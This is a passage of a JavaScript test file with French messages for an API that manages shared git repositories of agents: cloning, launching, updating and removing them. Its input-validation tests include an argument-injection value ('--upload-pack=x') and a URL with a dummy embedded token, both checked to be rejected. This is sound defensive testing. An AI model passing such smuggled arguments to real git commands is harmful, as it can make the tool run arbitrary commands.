  status: oneOf('ok', 'updating', 'error'), error: opt('string'), agents: 'int' };
test('agents : bibliothèques (dépôt git partagé) : ajout, agents avec leur source, lancement, mise à jour, retrait', { skip: !REAL_GIT && 'git absent' }, async () => {
  const dir = path.join(DATA, 'agents');
  w(path.join(dir, 'local', 'AGENT.md'), '---\nname: Agent local\n---\nConsigne.');
  // le dépôt publié par l'auteur : un dossier par agent
  const repo = path.join(REPOS, 'studio', 'agents');
  const env = { ...Object.fromEntries(Object.entries(process.env).filter(([k]) => !k.startsWith('GIT_'))), GIT_CONFIG_GLOBAL: '/dev/null', GIT_CONFIG_NOSYSTEM: '1',
    GIT_AUTHOR_NAME: 'Studio', GIT_AUTHOR_EMAIL: 'studio@example.com', GIT_COMMITTER_NAME: 'Studio', GIT_COMMITTER_EMAIL: 'studio@example.com' };
  const g = (...args) => { const r = spawnSync(REAL_GIT, args, { cwd: repo, env, encoding: 'utf8' }); assert.equal(r.status, 0, r.stderr); return r.stdout.trim(); };
  const page = (name) => `---\nname: ${name}\nfields:\n  - id: page\n    label: Page\n---\nModèles : {{dossier_agent}}/modeles. Page : {{page}}.\n`;
  w(path.join(repo, 'creer-une-page', 'AGENT.md'), page('Créer une page'));
  w(path.join(repo, 'creer-une-page', 'modeles', 'accueil.json'), '{}\n');
  w(path.join(repo, 'local', 'AGENT.md'), '---\nname: Local de la bibliothèque\n---\nConsigne.\n');
  g('init', '-q', '-b', 'main');
  g('add', '-A');
  g('commit', '-qm', 'v1');
  const v1 = g('rev-parse', 'HEAD');
  const gitCalls = () => { try { return fs.readFileSync(GIT_LOG, 'utf8').trim().split('\n').filter(Boolean).length; } catch { return 0; } };
  const url = 'https://github.com/studio/agents';
  const lib = (body, headers) => post('/api/v2/agents/libraries', body, headers);
  try {
    // une écriture comme les autres : en-tête et jeton
    assert.equal((await lib({ action: 'add', url }, { 'Content-Type': 'application/json' })).status, 403);
    assert.equal((await raw('POST', '/api/v2/agents/libraries', { body: { action: 'add', url }, headers: { 'X-Vigie': '1' }, token: null })).status, 401);
    assert.equal((await raw('GET', '/api/v2/agents/libraries')).status, 405);
    assert.equal(gitCalls(), 0);
    // refus : rien de lancé
    let r = await lib({ action: 'ajoute' });
    assert.deepEqual([r.status, r.body], [400, { ok: false, error: 'Action : add, update ou remove.' }]);
    for (const bad of [undefined, 'file:///Users/alex/agents', '/Users/alex/agents', 'http://github.com/studio/agents', '--upload-pack=x']) {
      r = await lib({ action: 'add', url: bad });
      assert.deepEqual([r.status, r.body], [400, { ok: false, error: 'Adresse refusée : colle l\'adresse du dépôt (https://github.com/… ou git@github.com:…).' }], String(bad));
    }
    r = await lib({ action: 'add', url: 'https://alex:ghp_A1b2C3d4E5f6@github.com/studio/agents' });
    assert.deepEqual([r.status, r.body.error], [400, 'N\'écris pas d\'identifiant dans l\'adresse : git utilise ceux de ton Mac.']);
    assert.equal(gitCalls(), 0, 'adresse refusée : git jamais lancé');
    r = await lib({ action: 'add', url: 'https://github.com/studio/absent' });
    assert.equal(r.status, 400);
    assert.ok(r.body.error.startsWith('Dépôt introuvable, ou git n\'a pas accès : vérifie l\'adresse, et que tu peux le cloner (gh auth login, ou ta clé SSH).'), r.body.error);
    // ajout : clonage, puis la bibliothèque et ses agents
    r = await lib({ action: 'add', url });
    assert.equal(r.status, 200, r.text);
    conforms(r.body, { ok: 'bool', library: Library, message: 'string' });
    assert.equal(r.body.message, 'Bibliothèque ajoutée : 2 agents.');
    assert.deepEqual([r.body.library.id, r.body.library.name, r.body.library.url, r.body.library.commit, r.body.library.status, r.body.library.error, r.body.library.agents],
      ['agents', 'studio/agents', url, v1.slice(0, 7), 'ok', null, 2]);
    assert.equal(fs.statSync(path.join(DATA, 'agent-libraries.json')).mode & 0o777, 0o600);
    assert.equal(fs.statSync(path.join(DATA, 'agent-libraries', 'agents')).mode & 0o777, 0o700);
    assert.ok(fs.readFileSync(GIT_LOG, 'utf8').includes('http.curloptResolve=github.com:443:140.82.112.3'), 'hôte résolu, adresse figée pour git');
    r = await lib({ action: 'add', url: `${url}.git` });
    assert.deepEqual([r.status, r.body.error], [400, LIB_MSG.duplicate]);
    // la liste : chaque agent avec sa source ; lue sans relancer git
    const before = gitCalls();
    r = await get('/api/v2/agents');
    assert.equal(gitCalls(), before, 'la liste ne lance pas git');
    conforms(r.body, { ...AgentsList, libraries: arr(Library) });
    assert.deepEqual(r.body.agents.map((a) => [a.id, a.source]), [
      ['local', { kind: 'local' }],
      ['creer-une-page', { kind: 'library', id: 'agents', name: 'studio/agents' }],
      ['agents-local', { kind: 'library', id: 'agents', name: 'studio/agents' }],
    ], 'un agent local n\'est jamais remplacé : celui de la bibliothèque prend <bibliothèque>-<dossier>');
    assert.deepEqual(r.body.libraries.map((l) => [l.id, l.name, l.status, l.agents, l.commit]), [['agents', 'studio/agents', 'ok', 2, v1.slice(0, 7)]]);
    // lancement d'un agent de la bibliothèque : {{dossier_agent}} est son dossier dans la version figée
    const folder = path.join(CODE, 'page-studio');
    fs.rmSync(MAC_LOG, { force: true });
    // la source vue à l'ouverture du formulaire : celle de l'agent, sinon 409 et rien n'est fait
    for (const source of [{ kind: 'local' }, { kind: 'library', id: 'autre' }]) {
      r = await post('/api/v2/agents/launch', { id: 'creer-une-page', values: { page: 'Accueil' }, folder, surface: 'claude-app', source });
      assert.deepEqual([r.status, r.body], [409, { ok: false, error: 'Cet agent a changé depuis l\'ouverture du formulaire : ferme-le et rouvre-le.' }], JSON.stringify(source));
    }
    r = await post('/api/v2/agents/launch', { id: 'local', values: {}, folder, surface: 'claude-app', source: { kind: 'library', id: 'agents' } });
    assert.equal(r.status, 409);
    assert.equal(fs.existsSync(folder), false, 'rien de créé');
    r = await post('/api/v2/agents/launch', { id: 'creer-une-page', values: { page: 'Accueil' }, folder, surface: 'claude-app', source: { kind: 'library', id: 'agents' } });
    assert.equal(r.status, 200, r.text);
    conforms(r.body, AgentLaunch);
    const agentDir = fs.realpathSync(path.join(DATA, 'agent-libraries', 'agents', v1.slice(0, 7), 'creer-une-page'));
    assert.ok(fs.readFileSync(r.body.briefFile, 'utf8').includes(`Modèles : ${agentDir}/modeles. Page : Accueil.`));
    assert.equal(r.body.prompt, `Lance l'agent « Créer une page » : lis le fichier ${r.body.briefFile} et suis ses consignes, dans le dossier ${folder}.`);
    // l'auteur publie une nouvelle version : mise à jour demandée
    w(path.join(repo, 'creer-une-page', 'AGENT.md'), page('Créer une page v2'));
    g('commit', '-qam', 'v2');
    const v2 = g('rev-parse', 'HEAD');
    r = await lib({ action: 'update', id: 'agents' });
    assert.equal(r.status, 200, r.text);
    conforms(r.body, { ok: 'bool', libraries: arr(Library), message: 'string' });
    assert.deepEqual([r.body.message, r.body.libraries[0].commit], ['Bibliothèque à jour : 2 agents.', v2.slice(0, 7)]);
    assert.equal((await get('/api/v2/agents')).body.agents.find((a) => a.id === 'creer-une-page').name, 'Créer une page v2');
    r = await lib({ action: 'update' });
    assert.deepEqual([r.status, r.body.ok, r.body.message], [200, true, 'Bibliothèque à jour : 2 agents.']);
    r = await lib({ action: 'update', id: 'inconnue' });
    assert.deepEqual([r.status, r.body], [404, { ok: false, error: LIB_MSG.notFound }]);
    // dépôt parti : la copie d'avant reste, l'erreur est montrée
    fs.renameSync(repo, `${repo}-parti`);
    r = await lib({ action: 'update', id: 'agents' });
    fs.renameSync(`${repo}-parti`, repo);
    assert.equal(r.status, 400);
    assert.ok(r.body.error.startsWith('Mise à jour impossible : dépôt introuvable'), r.body.error);
    const l = (await get('/api/v2/agents')).body.libraries[0];
    assert.deepEqual([l.status, l.error, l.commit, l.agents], ['error', r.body.error, v2.slice(0, 7), 2]);
    // retrait : la bibliothèque, sa copie et ses agents
    r = await lib({ action: 'remove', id: 'agents' });
    assert.deepEqual([r.status, r.body], [200, { ok: true, message: 'Bibliothèque retirée.' }]);
    assert.equal(fs.existsSync(path.join(DATA, 'agent-libraries', 'agents')), false);
    r = await get('/api/v2/agents');
    assert.deepEqual([r.body.libraries, r.body.agents.map((a) => a.id)], [[], ['local']]);
    r = await lib({ action: 'remove', id: 'agents' });
    assert.deepEqual([r.status, r.body.error], [404, LIB_MSG.notFound]);
    noSecret(r);
  } finally {
    await lib({ action: 'remove', id: 'agents' });
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('conversation jamais associée : affichée sur le compte des nouvelles conversations (comme le lanceur)', async () => {
  let other = (await get('/api/v2/accounts')).body.accounts.find((a) => a.id !== 'travail1');
  if (!other) other = (await post('/api/v2/accounts', { action: 'create', label: 'Compte essai' })).body.account;
  assert.ok(other?.id);
  assert.equal(rj(path.join(DATA, 'accounts.json')).sessions[SID_A], undefined, 'SID_A jamais associée');
  assert.equal((await post('/api/v2/accounts', { action: 'setDefault', id: other.id })).status, 200);
  const o = (await get('/api/v2/overview')).body;
  assert.equal(o.conversations.find((c) => c.id === SID_A).accountId, other.id);
  assert.equal(o.conversations.find((c) => c.id === SID_B).accountId, 'travail1', 'associée : son compte');
  assert.equal((await post('/api/v2/accounts', { action: 'setDefault', id: 'travail1' })).status, 200);
});
